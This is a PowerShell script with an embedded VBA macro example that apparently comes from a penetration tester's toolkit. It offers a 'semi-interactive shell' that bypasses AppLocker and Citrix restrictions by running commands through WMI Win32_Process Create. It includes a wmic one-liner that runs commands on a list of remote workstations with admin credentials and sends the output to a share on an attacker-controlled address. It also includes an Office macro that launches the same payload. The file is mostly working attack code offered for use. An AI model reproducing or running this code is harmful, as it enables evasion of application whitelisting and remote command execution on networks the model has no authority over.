<#
.SYNOPSIS
	PowerShell WMI Semi-Interactive shell for Applocker Policy Bypass
	
.DESCRIPTION
	Base payload use the following WMI authenticated (remote) code execution (rce):
		wmic /node:127.0.0.1 PROCESS CALL Create "cmd.exe /c netstat -ano >> C:/Temp/test"
		
	For rce case:
		wmic /node:@workstations.txt /user:[admin_for_privileged_rce] process call create "cmd.exe /c netstat -ano >> \\[YourIPaddr]\Temp\test"
		(where workstations.txt contains ip address list)

	This one can be used directly in .bat file, in a macro or via "run" if powershell.exe is not available.
	The .ps1 and .vba scripts below are examples of functional script and should be adapted following the context.
 
.PARAMETER Target
	Remote or local machine address or hostname
	In case of remote, privileged account is required

.PARAMETER Command
	Command that will be executed on the target

.PARAMETER Payload
	Final string (b64 encoded to escape special chars and spaces) that will be executed (using the "restricted" cmd.exe in this example)
	
.PARAMETER Bypass
	WMI method that bypass applocker policy using the previously defined payload

.PARAMETER EncodedPayload
	Final base64 encoded payload that permit to use argument such like "net localgroup" in the $Command argument
	
.NOTES
	File Name     : interactive-shell-applocker-bypass.ps1
	Author         : J.M Bourbon 
	Contact	   : mail.bourbon@gmail.com - @kmkz_security
	
	Introduction:
		Done during a mission in order to escape some different Citrix/Applocker restriction (and works well!), it needs
		to be cleaned up and improved, I know... I need time first, sorry. 
		
	Script details:
		Base 64 encoding is required to permit long string that contains special chars and argument to be correctly executed.
		
		Sleep time 0.6 is required to read file after process finished.
		It should be changed in case of remote code execution to prevent latency, however payload will be executed correctly.
		You also can re-run the script in order to read the output file correctly (so diiirty).

#>

$Target  = "127.0.0.1" 
$Command = "net localgroup > C:\temp\result.txt"
$Payload = "CMD.EXE /c "+$Command

$Bypass=Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $Payload -ComputerName $Target 
$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Bypass))

Start-Sleep -s 0.6
Get-Content \\$Target\C$\Temp\result.txt

<#
.SYNOPSIS
	PowerShell WMI Semi-Interactive shell VBA Macro (basic) for Applocker Policy bypass
	
.DESCRIPTION
	Office macro example that reproduce the previous PowerShell script in case of restricted (Citrix etc...) environment.
	As there is no base64 encoding, some command could failed, to bypass it, add the b64 encoding before executing payload.

.EXAMPLE 

	Sub sss()
		Dim wsh As Object
		Set wsh = VBA.CreateObject("WScript.Shell")
		Dim waitOnReturn As Boolean: waitOnReturn = True
		Dim windowStyle As Integer: windowStyle = 1

		wsh.Run "powershell.exe Invoke-WmiMethod -class Win32_process -name Create -ArgumentList 'cmd.exe /c netstat -ano >> C:/Temp/test' -ComputerName '127.0.0.1'", windowStyle, waitOnReturn
		wsh.Run "powershell.exe -NoExit Get-content C:/Temp/test"
	End Sub
#>